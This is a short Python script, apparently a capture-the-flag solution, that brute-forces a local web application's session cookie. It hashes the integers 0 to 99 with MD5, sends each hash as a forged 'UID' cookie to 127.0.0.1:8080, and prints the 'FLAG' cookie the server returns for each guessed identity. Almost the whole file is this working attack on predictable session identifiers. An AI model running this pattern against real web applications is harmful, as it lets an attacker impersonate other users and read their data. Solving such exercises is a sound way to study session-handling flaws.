import hashlib
import codecs
import numpy as np
import requests


#IP
ip = "127.0.0.1"
port= "8080"

#we first check that our MD5 works by comparing Md5(100) with
#the one in the webpage
control = "f899139df5e1059396431415e770c6dd"
tester = 100
tester_b = str.encode(str(tester))
tester_md5 = hashlib.md5(tester_b).hexdigest()
print(f"tester={tester_md5 == control}")

#try a request to the web application
cookies = {"UID":tester_md5}
r = requests.post(f"http://{ip}:{port}", cookies = cookies)
def_flag = r.cookies["FLAG"] #default flag)

print(f"default flag\t{def_flag}")

for i in range(0, 100):
    bf_b = str.encode(str(i))
    bf_md5 = hashlib.md5(bf_b).hexdigest()
    cookies = {"UID":bf_md5}
    re = requests.post(f"http://{ip}:{port}", cookies = cookies)
    def_flag = re.cookies["FLAG"] #default flag)
    print(f"default flag\t{def_flag}")